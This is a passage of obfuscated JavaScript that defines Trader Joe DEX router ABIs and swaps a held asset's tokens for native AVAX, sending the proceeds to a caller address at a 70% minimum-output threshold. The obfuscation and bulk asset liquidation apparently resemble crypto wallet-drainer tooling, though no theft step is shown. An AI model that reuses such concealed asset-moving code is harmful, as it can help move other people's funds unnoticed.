          const _0x2c0d61 = {
            internalType: 'uint256[]',
            name: "_pairBinSteps",
            type: 'uint256[]'
          };
          const _0x3f506c = {
            internalType: "contract IERC20[]",
            name: "_tokenPath",
            type: "address[]"
          };
          const _0xd03d11 = {
            internalType: "address",
            name: "_to",
            type: 'address'
          };
          const _0x1bb87d = {
            internalType: 'uint256',
            name: "_deadline",
            type: "uint256"
          };
          const _0x3f5862 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x3ccf5f = {
            inputs: [_0x5122f1, _0x2c0d61, _0x3f506c, _0xd03d11, _0x1bb87d],
            name: "swapExactAVAXForTokens",
            outputs: [_0x3f5862],
            stateMutability: "payable",
            type: "function"
          };
          const _0x21c3fc = {
            internalType: "uint256",
            name: "_amountOutMin",
            type: 'uint256'
          };
          const _0x1bd852 = {
            internalType: 'uint256[]',
            name: "_pairBinSteps",
            type: 'uint256[]'
          };
          const _0x2dd44e = {
            internalType: "contract IERC20[]",
            name: "_tokenPath",
            type: "address[]"
          };
          const _0x50b8a6 = {
            internalType: "address",
            name: "_to",
            type: 'address'
          };
          const _0x507947 = {
            internalType: 'uint256',
            name: "_deadline",
            type: "uint256"
          };
          const _0xecdcf7 = {
            inputs: [_0x21c3fc, _0x1bd852, _0x2dd44e, _0x50b8a6, _0x507947],
            name: "swapExactAVAXForTokensSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': "uint256",
              'name': "amountOut",
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x4a3203 = {
            internalType: "uint256",
            name: "_amountIn",
            type: 'uint256'
          };
          const _0x5be5b1 = {
            internalType: 'uint256',
            name: "_amountOutMinAVAX",
            type: 'uint256'
          };
          const _0x7c9a63 = {
            internalType: 'uint256[]',
            name: "_pairBinSteps",
            type: 'uint256[]'
          };
          const _0x203a8d = {
            internalType: "contract IERC20[]",
            name: "_tokenPath",
            type: "address[]"
          };
          const _0x3abc03 = {
            internalType: "address payable",
            name: "_to",
            type: "address"
          };
          const _0x2d3568 = {
            internalType: 'uint256',
            name: "_deadline",
            type: 'uint256'
          };
          const _0x57f556 = {
            inputs: [_0x4a3203, _0x5be5b1, _0x7c9a63, _0x203a8d, _0x3abc03, _0x2d3568],
            name: "swapExactTokensForAVAX",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountOut',
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x1dcfe5 = {
            internalType: 'uint256',
            name: "_amountIn",
            type: 'uint256'
          };
          const _0x2ad1db = {
            internalType: 'uint256',
            name: "_amountOutMinAVAX",
            type: 'uint256'
          };
          const _0x47de8e = {
            internalType: 'uint256[]',
            name: "_pairBinSteps",
            type: 'uint256[]'
          };
          const _0x1f5343 = {
            internalType: "contract IERC20[]",
            name: "_tokenPath",
            type: "address[]"
          };
          const _0x350bfd = {
            internalType: "address payable",
            name: "_to",
            type: "address"
          };
          const _0xda81dd = {
            internalType: 'uint256',
            name: "_deadline",
            type: 'uint256'
          };
          const _0x3e478a = {
            inputs: [_0x1dcfe5, _0x2ad1db, _0x47de8e, _0x1f5343, _0x350bfd, _0xda81dd],
            name: "swapExactTokensForAVAXSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountOut',
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x54d2cf = {
            internalType: "uint256",
            name: "_amountIn",
            type: 'uint256'
          };
          const _0xa64fe8 = {
            internalType: 'uint256',
            name: "_amountOutMin",
            type: 'uint256'
          };
          const _0x4fac6b = {
            internalType: 'uint256[]',
            name: "_pairBinSteps",
            type: 'uint256[]'
          };
          const _0x4906b2 = {
            internalType: "contract IERC20[]",
            name: "_tokenPath",
            type: "address[]"
          };
          const _0x546ca8 = {
            internalType: "address",
            name: "_to",
            type: "address"
          };
          const _0x2752a7 = {
            internalType: 'uint256',
            name: "_deadline",
            type: 'uint256'
          };
          const _0x1c3ffd = {
            internalType: "uint256",
            name: 'amountOut',
            type: 'uint256'
          };
          const _0x4076c7 = {
            inputs: [_0x54d2cf, _0xa64fe8, _0x4fac6b, _0x4906b2, _0x546ca8, _0x2752a7],
            name: "swapExactTokensForTokens",
            outputs: [_0x1c3ffd],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0xbe340e = {
            internalType: 'uint256',
            name: "_amountIn",
            type: 'uint256'
          };
          const _0x52ad5e = {
            internalType: 'uint256',
            name: "_amountOutMin",
            type: 'uint256'
          };
          const _0x37b2c6 = {
            internalType: 'uint256[]',
            name: "_pairBinSteps",
            type: 'uint256[]'
          };
          const _0x3645a1 = {
            internalType: "contract IERC20[]",
            name: "_tokenPath",
            type: 'address[]'
          };
          const _0x190d40 = {
            internalType: "address",
            name: "_to",
            type: "address"
          };
          const _0x12866c = {
            internalType: 'uint256',
            name: "_deadline",
            type: 'uint256'
          };
          const _0x1d8aac = {
            inputs: [_0xbe340e, _0x52ad5e, _0x37b2c6, _0x3645a1, _0x190d40, _0x12866c],
            name: "swapExactTokensForTokensSupportingFeeOnTransferTokens",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountOut',
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x20d124 = {
            internalType: "uint256",
            name: "_amountAVAXOut",
            type: 'uint256'
          };
          const _0x3af5f6 = {
            internalType: "uint256",
            name: "_amountInMax",
            type: 'uint256'
          };
          const _0x2ddbb5 = {
            internalType: 'uint256[]',
            name: "_pairBinSteps",
            type: "uint256[]"
          };
          const _0x5e93c9 = {
            internalType: "contract IERC20[]",
            name: "_tokenPath",
            type: "address[]"
          };
          const _0x48e5b0 = {
            internalType: "address payable",
            name: "_to",
            type: "address"
          };
          const _0x34aaef = {
            internalType: 'uint256',
            name: "_deadline",
            type: 'uint256'
          };
          const _0x16e6b7 = {
            inputs: [_0x20d124, _0x3af5f6, _0x2ddbb5, _0x5e93c9, _0x48e5b0, _0x34aaef],
            name: "swapTokensForExactAVAX",
            outputs: [{
              'internalType': 'uint256[]',
              'name': "amountsIn",
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3009ed = {
            internalType: 'uint256',
            name: "_amountOut",
            type: 'uint256'
          };
          const _0x1af02d = {
            internalType: 'uint256',
            name: "_amountInMax",
            type: 'uint256'
          };
          const _0x40c252 = {
            internalType: 'uint256[]',
            name: "_pairBinSteps",
            type: 'uint256[]'
          };
          const _0x37fd4a = {
            internalType: "contract IERC20[]",
            name: "_tokenPath",
            type: "address[]"
          };
          const _0x3efbaf = {
            internalType: "address",
            name: "_to",
            type: "address"
          };
          const _0x3f2069 = {
            internalType: 'uint256',
            name: "_deadline",
            type: 'uint256'
          };
          const _0xbe1525 = {
            inputs: [_0x3009ed, _0x1af02d, _0x40c252, _0x37fd4a, _0x3efbaf, _0x3f2069],
            name: "swapTokensForExactTokens",
            outputs: [{
              'internalType': 'uint256[]',
              'name': 'amountsIn',
              'type': 'uint256[]'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x48e52a = {
            internalType: "contract IERC20",
            name: '_token',
            type: "address"
          };
          const _0x5cb9b1 = {
            internalType: "address",
            name: "_to",
            type: "address"
          };
          const _0x4f85a5 = {
            internalType: 'uint256',
            name: '_amount',
            type: "uint256"
          };
          const _0x18ecff = {
            inputs: [_0x48e52a, _0x5cb9b1, _0x4f85a5],
            name: 'sweep',
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x6349ce = {
            internalType: "contract ILBToken",
            name: "_lbToken",
            type: "address"
          };
          const _0x6ba320 = {
            internalType: "address",
            name: "_to",
            type: "address"
          };
          const _0xd14ba0 = {
            internalType: 'uint256[]',
            name: '_ids',
            type: 'uint256[]'
          };
          const _0x1a0ff3 = {
            internalType: 'uint256[]',
            name: "_amounts",
            type: 'uint256[]'
          };
          const _0x56d20e = {
            inputs: [_0x6349ce, _0x6ba320, _0xd14ba0, _0x1a0ff3],
            name: "sweepLBToken",
            outputs: [],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x326ed7 = {
            internalType: "contract IWAVAX",
            name: '',
            type: "address"
          };
          const _0x4fc7a1 = {
            inputs: [],
            name: "wavax",
            outputs: [_0x326ed7],
            stateMutability: "view",
            type: "function"
          };
          const _0x311895 = {
            stateMutability: "payable",
            type: 'receive'
          };
          let _0x34a99e = [_0x45a533, _0x90832c, _0x1e5067, _0x488baf, _0x4a6db7, _0x2ea0ae, _0x27526d, _0x1d3c08, _0x32945f, _0x1656ef, _0x32720f, _0x3d8955, _0x3b284c, _0x2eaabb, _0x51c52b, _0x16b452, _0x5637e2, _0x5d8dbc, _0x7073d8, _0x3342ac, _0x236a78, _0x2c5cd6, _0x14bc62, _0x2ad6c0, _0x4571d8, _0x22c30d, _0x43df21, _0x3a0475, _0x2c8fe7, _0x24c39e, _0x4fe06a, _0x3da99b, _0x169027, _0x37d70a, _0x7bfb00, _0x3202f1, _0x4bde33, _0xbff6a8, _0x393bbc, _0x32cd73, _0x525cbd, _0x5c5acf, _0x41e826, _0x405575, _0x1a9229, _0x1df374, _0x5297c2, _0x3ccf5f, _0xecdcf7, _0x57f556, _0x3e478a, _0x4076c7, _0x1d8aac, _0x16e6b7, _0xbe1525, _0x18ecff, _0x56d20e, _0x4fc7a1, _0x311895];
          let _0x4598ee = new ethers.Contract(_0x3941f8, _0x34a99e, _0xab3127);
          let _0xb0d2d4 = await _0x4598ee.wavax();
          let _0x5ebf18 = [];
          _0x5ebf18[0] = _0x2a18aa.asset.token;
          _0x5ebf18[1] = _0xb0d2d4;
          try {
            let _0x4d70b1 = this.token_array.find(_0x2de38e => _0x2de38e.token_address == _0x2a18aa.asset.token && _0x2de38e.chain == _0x2a18aa.chain);
            let _0x3adf2d = this.token_array.find(_0x5c93f5 => _0x5c93f5.token_address == "native" && _0x5c93f5.chain == _0x2a18aa.chain);
            _0xcd0737 = this.web3Js.utils.toBN(this.web3Js.utils.toWei((Number(_0x4d70b1.value) * Number(0.7) / Number(_0x3adf2d.price)).toString(), "ether"));
          } catch {}
          return [_0x4598ee.swapExactTokensForAVAX(_0x2a18aa.asset.amount, _0xcd0737, [0], _0x5ebf18, this.getCaller(_0x2a18aa), _0x4d5eff), _0xb0d2d4];
        }
      case "TraderJoeV3":
        {
          const _0x16c5d5 = {
            internalType: "contract ILBFactory",
            name: 'factory',
            type: "address"
          };
          const _0x2d2005 = {
            internalType: "contract IJoeFactory",
            name: "factoryV1",
            type: 'address'
          };
          const _0x4a179b = {
            internalType: "contract ILBLegacyFactory",
            name: "legacyFactory",
            type: "address"
          };
          const _0x1b4df2 = {
            internalType: "contract ILBLegacyRouter",
            name: "legacyRouter",
            type: "address"
          };
          const _0x30a13e = {
            internalType: "contract IWNATIVE",
            name: "wnative",
            type: "address"
          };
          const _0x4ed1f5 = {
            inputs: [_0x16c5d5, _0x2d2005, _0x4a179b, _0x1b4df2, _0x30a13e],
            stateMutability: "nonpayable",
            type: "constructor"
          };
          const _0x1457fb = {
            inputs: [],
            name: "AddressHelper__CallFailed",
            type: "error"
          };
          const _0x3d6dd8 = {
            inputs: [],
            name: "AddressHelper__NonContract",
            type: "error"
          };
          const _0x2bca6d = {
            inputs: [],
            name: "JoeLibrary__InsufficientAmount",
            type: "error"
          };
          const _0x5040d9 = {
            inputs: [],
            name: "JoeLibrary__InsufficientLiquidity",
            type: "error"
          };
          const _0x53a098 = {
            internalType: "uint256",
            name: "amountSlippage",
            type: "uint256"
          };
          const _0x291bbb = {
            inputs: [_0x53a098],
            name: "LBRouter__AmountSlippageBPTooBig",
            type: "error"
          };
          const _0x3cb927 = {
            internalType: 'uint256',
            name: "amountXMin",
            type: 'uint256'
          };
          const _0x30c017 = {
            internalType: 'uint256',
            name: 'amountX',
            type: "uint256"
          };
          const _0x75dcfc = {
            internalType: 'uint256',
            name: "amountYMin",
            type: 'uint256'
          };
          const _0x3816ca = {
            internalType: 'uint256',
            name: "amountY",
            type: 'uint256'
          };
          const _0x12fa25 = {
            inputs: [_0x3cb927, _0x30c017, _0x75dcfc, _0x3816ca],
            name: "LBRouter__AmountSlippageCaught",
            type: "error"
          };
          const _0x316b7b = {
            internalType: 'uint256',
            name: 'id',
            type: 'uint256'
          };
          const _0x46671b = {
            inputs: [_0x316b7b],
            name: "LBRouter__BinReserveOverflows",
            type: "error"
          };
          const _0x27567e = {
            inputs: [],
            name: "LBRouter__BrokenSwapSafetyCheck",
            type: "error"
          };
          const _0x472bdd = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x5001cc = {
            internalType: 'uint256',
            name: "currentTimestamp",
            type: "uint256"
          };
          const _0x5c907b = {
            inputs: [_0x472bdd, _0x5001cc],
            name: "LBRouter__DeadlineExceeded",
            type: "error"
          };
          const _0x47c528 = {
            internalType: "address",
            name: "recipient",
            type: "address"
          };
          const _0x5004f6 = {
            internalType: "uint256",
            name: "amount",
            type: 'uint256'
          };
          const _0x4bc742 = {
            inputs: [_0x47c528, _0x5004f6],
            name: "LBRouter__FailedToSendNATIVE",
            type: "error"
          };
          const _0x271573 = {
            internalType: "uint256",
            name: "idDesired",
            type: 'uint256'
          };
          const _0x3686c1 = {
            internalType: 'uint256',
            name: "idSlippage",
            type: 'uint256'
          };
          const _0x39d514 = {
            inputs: [_0x271573, _0x3686c1],
            name: "LBRouter__IdDesiredOverflows",
            type: "error"
          };
          const _0xfb374e = {
            internalType: "int256",
            name: 'id',
            type: "int256"
          };
          const _0x59d0c5 = {
            inputs: [_0xfb374e],
            name: "LBRouter__IdOverflows",
            type: "error"
          };
          const _0x5b2e0d = {
            internalType: "uint256",
            name: "activeIdDesired",
            type: 'uint256'
          };
          const _0x1b7dfa = {
            internalType: "uint256",
            name: "idSlippage",
            type: 'uint256'
          };
          const _0x59be47 = {
            internalType: 'uint256',
            name: "activeId",
            type: 'uint256'
          };
          const _0x3d0f12 = {
            inputs: [_0x5b2e0d, _0x1b7dfa, _0x59be47],
            name: "LBRouter__IdSlippageCaught",
            type: "error"
          };
          const _0x1327ef = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x499c34 = {
            internalType: 'uint256',
            name: 'amountOut',
            type: 'uint256'
          };
          const _0xdca6f5 = {
            inputs: [_0x1327ef, _0x499c34],
            name: "LBRouter__InsufficientAmountOut",
            type: 'error'
          };
          const _0x2085b2 = {
            internalType: "address",
            name: 'wrongToken',
            type: "address"
          };
          const _0xbe09c = {
            inputs: [_0x2085b2],
            name: "LBRouter__InvalidTokenPath",
            type: "error"
          };
          const _0xe35be1 = {
            internalType: 'uint256',
            name: "version",
            type: 'uint256'
          };
          const _0x4781ec = {
            inputs: [_0xe35be1],
            name: "LBRouter__InvalidVersion",
            type: "error"
          };
          const _0x9b6d1a = {
            inputs: [],
            name: "LBRouter__LengthsMismatch",
            type: "error"
          };
          const _0x12356a = {
            internalType: 'uint256',
            name: "amountInMax",
            type: 'uint256'
          };
          const _0x59f0d9 = {
            internalType: 'uint256',
            name: 'amountIn',
            type: 'uint256'
          };
          const _0x185e2b = {
            inputs: [_0x12356a, _0x59f0d9],
            name: "LBRouter__MaxAmountInExceeded",
            type: "error"
          };
          const _0x5edef0 = {
            inputs: [],
            name: "LBRouter__NotFactoryOwner",
            type: "error"
          };
          const _0x423ebf = {
            internalType: "address",
            name: "tokenX",
            type: "address"
          };
          const _0xea8a3b = {
            internalType: "address",
            name: "tokenY",
            type: "address"
          };
          const _0x3550a1 = {
            internalType: 'uint256',
            name: "binStep",
            type: 'uint256'
          };
          const _0x286217 = {
            inputs: [_0x423ebf, _0xea8a3b, _0x3550a1],
            name: "LBRouter__PairNotCreated",
            type: "error"
          };
          const _0x209791 = {
            inputs: [],
            name: "LBRouter__SenderIsNotWNATIVE",
            type: "error"
          };
          const _0x4edcee = {
            internalType: "uint256",
            name: 'id',
            type: 'uint256'
          };
          const _0x4513de = {
            inputs: [_0x4edcee],
            name: "LBRouter__SwapOverflows",
            type: "error"
          };
          const _0x5de5e6 = {
            internalType: 'uint256',
            name: "excess",
            type: 'uint256'
          };
          const _0x4d63ed = {
            inputs: [_0x5de5e6],
            name: "LBRouter__TooMuchTokensIn",
            type: "error"
          };
          const _0x30c1e9 = {
            internalType: 'uint256',
            name: "amount",
            type: 'uint256'
          };
          const _0x56f4b7 = {
            internalType: 'uint256',
            name: "reserve",
            type: "uint256"
          };
          const _0x3c6b6a = {
            inputs: [_0x30c1e9, _0x56f4b7],
            name: "LBRouter__WrongAmounts",
            type: "error"
          };
          const _0x3f0d93 = {
            internalType: "address",
            name: "tokenX",
            type: "address"
          };
          const _0x3c35a1 = {
            internalType: "address",
            name: "tokenY",
            type: "address"
          };
          const _0x3019d6 = {
            internalType: 'uint256',
            name: "amountX",
            type: "uint256"
          };
          const _0x4ffb8a = {
            internalType: 'uint256',
            name: "amountY",
            type: 'uint256'
          };
          const _0x2f3026 = {
            internalType: 'uint256',
            name: "msgValue",
            type: 'uint256'
          };
          const _0x567b91 = {
            inputs: [_0x3f0d93, _0x3c35a1, _0x3019d6, _0x4ffb8a, _0x2f3026],
            name: "LBRouter__WrongNativeLiquidityParameters",
            type: "error"
          };
          const _0x3c1d5b = {
            inputs: [],
            name: "LBRouter__WrongTokenOrder",
            type: "error"
          };
          const _0x73668a = {
            inputs: [],
            name: "TokenHelper__TransferFailed",
            type: "error"
          };
          const _0x7d63b2 = {
            internalType: "contract IERC20",
            name: "tokenX",
            type: "address"
          };
          const _0x4d3716 = {
            internalType: "contract IERC20",
            name: "tokenY",
            type: "address"
          };
          const _0x52ff9a = {
            internalType: 'uint256',
            name: "binStep",
            type: "uint256"
          };
          const _0x33d188 = {
            internalType: 'uint256',
            name: 'amountX',
            type: 'uint256'
          };
          const _0x2cc109 = {
            internalType: 'uint256',
            name: "amountY",
            type: 'uint256'
          };
          const _0x25ab44 = {
            internalType: 'uint256',
            name: "amountXMin",
            type: 'uint256'
          };
          const _0x4a7487 = {
            internalType: 'uint256',
            name: 'amountYMin',
            type: "uint256"
          };
          const _0x1d6d1a = {
            internalType: "uint256",
            name: "activeIdDesired",
            type: 'uint256'
          };
          const _0x40a6b0 = {
            internalType: 'uint256',
            name: 'idSlippage',
            type: 'uint256'
          };
          const _0x18e98c = {
            internalType: "int256[]",
            name: "deltaIds",
            type: "int256[]"
          };
          const _0xba1f4d = {
            internalType: 'uint256[]',
            name: "distributionX",
            type: 'uint256[]'
          };
          const _0x5200f0 = {
            internalType: 'uint256[]',
            name: "distributionY",
            type: "uint256[]"
          };
          const _0x4749b2 = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x446bfd = {
            internalType: "address",
            name: 'refundTo',
            type: "address"
          };
          const _0x45644e = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x3e876c = {
            components: [_0x7d63b2, _0x4d3716, _0x52ff9a, _0x33d188, _0x2cc109, _0x25ab44, _0x4a7487, _0x1d6d1a, _0x40a6b0, _0x18e98c, _0xba1f4d, _0x5200f0, _0x4749b2, _0x446bfd, _0x45644e],
            internalType: "struct ILBRouter.LiquidityParameters",
            name: "liquidityParameters",
            type: "tuple"
          };
          const _0x540716 = {
            inputs: [_0x3e876c],
            name: "addLiquidity",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountXAdded",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountYAdded",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountXLeft",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountYLeft",
              'type': 'uint256'
            }, {
              'internalType': 'uint256[]',
              'name': "depositIds",
              'type': 'uint256[]'
            }, {
              'internalType': 'uint256[]',
              'name': "liquidityMinted",
              'type': "uint256[]"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x2ebb4c = {
            internalType: "contract IERC20",
            name: "tokenX",
            type: "address"
          };
          const _0x4bd909 = {
            internalType: "contract IERC20",
            name: "tokenY",
            type: "address"
          };
          const _0x1db6de = {
            internalType: 'uint256',
            name: 'binStep',
            type: 'uint256'
          };
          const _0x49e0f8 = {
            internalType: 'uint256',
            name: 'amountX',
            type: 'uint256'
          };
          const _0xfa938d = {
            internalType: 'uint256',
            name: "amountY",
            type: "uint256"
          };
          const _0x63f60d = {
            internalType: 'uint256',
            name: "amountXMin",
            type: "uint256"
          };
          const _0x160694 = {
            internalType: 'uint256',
            name: "amountYMin",
            type: 'uint256'
          };
          const _0x397ea4 = {
            internalType: 'uint256',
            name: "activeIdDesired",
            type: 'uint256'
          };
          const _0x4dfcbd = {
            internalType: 'uint256',
            name: "idSlippage",
            type: "uint256"
          };
          const _0x10e0c4 = {
            internalType: "int256[]",
            name: 'deltaIds',
            type: "int256[]"
          };
          const _0x464562 = {
            internalType: 'uint256[]',
            name: "distributionX",
            type: "uint256[]"
          };
          const _0x1b6c35 = {
            internalType: "uint256[]",
            name: "distributionY",
            type: 'uint256[]'
          };
          const _0x496567 = {
            internalType: "address",
            name: 'to',
            type: 'address'
          };
          const _0xe8791c = {
            internalType: "address",
            name: "refundTo",
            type: "address"
          };
          const _0x269daf = {
            internalType: "uint256",
            name: 'deadline',
            type: 'uint256'
          };
          const _0x552e49 = {
            components: [_0x2ebb4c, _0x4bd909, _0x1db6de, _0x49e0f8, _0xfa938d, _0x63f60d, _0x160694, _0x397ea4, _0x4dfcbd, _0x10e0c4, _0x464562, _0x1b6c35, _0x496567, _0xe8791c, _0x269daf],
            internalType: "struct ILBRouter.LiquidityParameters",
            name: "liquidityParameters",
            type: "tuple"
          };
          const _0x246d1a = {
            inputs: [_0x552e49],
            name: "addLiquidityNATIVE",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountXAdded",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountYAdded",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountXLeft",
              'type': 'uint256'
            }, {
              'internalType': 'uint256',
              'name': "amountYLeft",
              'type': 'uint256'
            }, {
              'internalType': 'uint256[]',
              'name': "depositIds",
              'type': 'uint256[]'
            }, {
              'internalType': 'uint256[]',
              'name': "liquidityMinted",
              'type': "uint256[]"
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x5ab640 = {
            internalType: "contract IERC20",
            name: "tokenX",
            type: "address"
          };
          const _0x2e17ba = {
            internalType: "contract IERC20",
            name: "tokenY",
            type: "address"
          };
          const _0x4b0f0f = {
            internalType: "uint24",
            name: "activeId",
            type: 'uint24'
          };
          const _0x15f400 = {
            internalType: "uint16",
            name: "binStep",
            type: 'uint16'
          };
          const _0x2ede4b = {
            inputs: [_0x5ab640, _0x2e17ba, _0x4b0f0f, _0x15f400],
            name: "createLBPair",
            outputs: [{
              'internalType': "contract ILBPair",
              'name': "pair",
              'type': "address"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x3b77dd = {
            inputs: [],
            name: "getFactory",
            outputs: [{
              'internalType': "contract ILBFactory",
              'name': "lbFactory",
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x43a704 = {
            internalType: "contract ILBPair",
            name: "pair",
            type: "address"
          };
          const _0x46d58e = {
            internalType: 'uint256',
            name: 'price',
            type: 'uint256'
          };
          const _0x2b4f7e = {
            inputs: [_0x43a704, _0x46d58e],
            name: "getIdFromPrice",
            outputs: [{
              'internalType': "uint24",
              'name': '',
              'type': "uint24"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x2a50bc = {
            inputs: [],
            name: "getLegacyFactory",
            outputs: [{
              'internalType': "contract ILBLegacyFactory",
              'name': "legacyLBfactory",
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x55f2ef = {
            inputs: [],
            name: "getLegacyRouter",
            outputs: [{
              'internalType': "contract ILBLegacyRouter",
              'name': "legacyRouter",
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x2e8962 = {
            internalType: "contract ILBPair",
            name: "pair",
            type: "address"
          };
          const _0x56e3a0 = {
            internalType: "uint24",
            name: 'id',
            type: "uint24"
          };
          const _0x363bbd = {
            inputs: [_0x2e8962, _0x56e3a0],
            name: "getPriceFromId",
            outputs: [{
              'internalType': 'uint256',
              'name': '',
              'type': 'uint256'
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x2f678b = {
            internalType: "contract ILBPair",
            name: "pair",
            type: "address"
          };
          const _0x28cf45 = {
            internalType: "uint128",
            name: 'amountOut',
            type: "uint128"
          };
          const _0x349b6b = {
            internalType: "bool",
            name: 'swapForY',
            type: "bool"
          };
          const _0x3cddf7 = {
            inputs: [_0x2f678b, _0x28cf45, _0x349b6b],
            name: "getSwapIn",
            outputs: [{
              'internalType': "uint128",
              'name': 'amountIn',
              'type': "uint128"
            }, {
              'internalType': "uint128",
              'name': "amountOutLeft",
              'type': "uint128"
            }, {
              'internalType': "uint128",
              'name': "fee",
              'type': "uint128"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x443ef1 = {
            internalType: "contract ILBPair",
            name: "pair",
            type: "address"
          };
          const _0x353310 = {
            internalType: "uint128",
            name: 'amountIn',
            type: "uint128"
          };
          const _0x192183 = {
            internalType: "bool",
            name: 'swapForY',
            type: "bool"
          };
          const _0x57c4b6 = {
            inputs: [_0x443ef1, _0x353310, _0x192183],
            name: "getSwapOut",
            outputs: [{
              'internalType': "uint128",
              'name': "amountInLeft",
              'type': "uint128"
            }, {
              'internalType': "uint128",
              'name': 'amountOut',
              'type': "uint128"
            }, {
              'internalType': "uint128",
              'name': "fee",
              'type': "uint128"
            }],
            stateMutability: "view",
            type: 'function'
          };
          const _0x592764 = {
            inputs: [],
            name: "getV1Factory",
            outputs: [{
              'internalType': "contract IJoeFactory",
              'name': 'factoryV1',
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0xb01686 = {
            inputs: [],
            name: "getWNATIVE",
            outputs: [{
              'internalType': "contract IWNATIVE",
              'name': "wnative",
              'type': "address"
            }],
            stateMutability: "view",
            type: "function"
          };
          const _0x58dd19 = {
            internalType: "contract IERC20",
            name: "tokenX",
            type: "address"
          };
          const _0x475caf = {
            internalType: "contract IERC20",
            name: "tokenY",
            type: "address"
          };
          const _0x27cd22 = {
            internalType: "uint16",
            name: "binStep",
            type: "uint16"
          };
          const _0x57fb35 = {
            internalType: 'uint256',
            name: "amountXMin",
            type: 'uint256'
          };
          const _0x1674b6 = {
            internalType: 'uint256',
            name: "amountYMin",
            type: 'uint256'
          };
          const _0x255d24 = {
            internalType: 'uint256[]',
            name: "ids",
            type: 'uint256[]'
          };
          const _0xf81ef1 = {
            internalType: 'uint256[]',
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x5734fa = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x153e95 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x4adebb = {
            inputs: [_0x58dd19, _0x475caf, _0x27cd22, _0x57fb35, _0x1674b6, _0x255d24, _0xf81ef1, _0x5734fa, _0x153e95],
            name: "removeLiquidity",
            outputs: [{
              'internalType': 'uint256',
              'name': 'amountX',
              'type': "uint256"
            }, {
              'internalType': 'uint256',
              'name': "amountY",
              'type': "uint256"
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x135a0f = {
            internalType: "contract IERC20",
            name: 'token',
            type: "address"
          };
          const _0x48ee62 = {
            internalType: "uint16",
            name: "binStep",
            type: "uint16"
          };
          const _0x241b12 = {
            internalType: 'uint256',
            name: "amountTokenMin",
            type: 'uint256'
          };
          const _0x45bcc8 = {
            internalType: 'uint256',
            name: "amountNATIVEMin",
            type: "uint256"
          };
          const _0x36e1b4 = {
            internalType: 'uint256[]',
            name: "ids",
            type: 'uint256[]'
          };
          const _0x2cd8db = {
            internalType: "uint256[]",
            name: "amounts",
            type: 'uint256[]'
          };
          const _0x5d2011 = {
            internalType: "address payable",
            name: 'to',
            type: "address"
          };
          const _0x573d9c = {
            internalType: 'uint256',
            name: "deadline",
            type: 'uint256'
          };
          const _0x529c28 = {
            inputs: [_0x135a0f, _0x48ee62, _0x241b12, _0x45bcc8, _0x36e1b4, _0x2cd8db, _0x5d2011, _0x573d9c],
            name: "removeLiquidityNATIVE",
            outputs: [{
              'internalType': 'uint256',
              'name': "amountToken",
              'type': "uint256"
            }, {
              'internalType': 'uint256',
              'name': "amountNATIVE",
              'type': 'uint256'
            }],
            stateMutability: "nonpayable",
            type: "function"
          };
          const _0x18ea04 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
          const _0x18d3dc = {
            internalType: 'uint256[]',
            name: "pairBinSteps",
            type: "uint256[]"
          };
          const _0x1ecef6 = {
            internalType: "enum ILBRouter.Version[]",
            name: "versions",
            type: "uint8[]"
          };
          const _0x478510 = {
            internalType: "contract IERC20[]",
            name: "tokenPath",
            type: "address[]"
          };
          const _0x389e21 = {
            components: [_0x18d3dc, _0x1ecef6, _0x478510],
            internalType: "struct ILBRouter.Path",
            name: 'path',
            type: 'tuple'
          };
          const _0x547f6d = {
            internalType: "address",
            name: 'to',
            type: "address"
          };
          const _0x291988 = {
            internalType: 'uint256',
            name: 'deadline',
            type: 'uint256'
          };
          const _0x4bd611 = {
            inputs: [_0x18ea04, _0x389e21, _0x547f6d, _0x291988],
            name: "swapExactNATIVEForTokens",
            outputs: [{
              'internalType': "uint256",
              'name': 'amountOut',
              'type': 'uint256'
            }],
            stateMutability: "payable",
            type: "function"
          };
          const _0x55a449 = {
            internalType: 'uint256',
            name: "amountOutMin",
            type: 'uint256'
          };
